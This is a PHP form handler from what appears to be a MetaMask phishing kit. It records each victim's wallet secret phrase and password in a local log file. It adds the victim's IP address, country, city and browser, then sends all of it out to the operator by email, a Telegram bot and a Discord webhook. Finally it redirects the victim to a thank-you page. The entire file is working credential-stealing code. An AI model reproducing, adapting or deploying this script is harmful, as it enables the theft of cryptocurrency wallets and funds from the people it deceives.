<?php
include '../admin/config.php';
include("system.php");
include("detect.php");
$chatId = trim(file_get_contents("../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../admin/config/status_discord.ini"));
$user_ids = trim(file_get_contents("../admin/config/email.ini"));
$webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
extract($_REQUEST);
$file1 = fopen("../results/logins.txt", "a");
fwrite($file1, $cdx0 ."|". $cdx ."|". $cdx1);
fwrite($file1, "\n");
fclose($file1);


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$cdx0 = $_POST["cdx0"];
$cdx = $_POST["cdx"];
$cdx1 = $_POST["cdx1"];
$ip		= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
META.MASK LOGIN INFO 
Wallet Secret Phrase = $cdx0
Password = $cdx
Confirm Password = $cdx1
META.MASK LOGIN INFO 

META.MASK IP INFOS
IP      = $ip
Country = $countryname
City    = $countrycity
TIME = $InfoDATE 
BROWSER = $UserAgent
META.MASK IP INFOS
";

$msg = "
META.MASK LOGIN INFO <br>
Wallet Secret Phrase = $cdx0 <br>
Password = $cdx <br>
Confirm Password = $cdx1 <br>
META.MASK LOGIN INFO
<br>
META.MASK IP INFOS <br>
IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
META.MASK IP INFOS <br>

";


// Email send function
$sender = 'From:Meta<resultz@fgame.com>';
$sub="NEW META.MASK LOGIN FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($user_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

header("location: ../thanks.php");
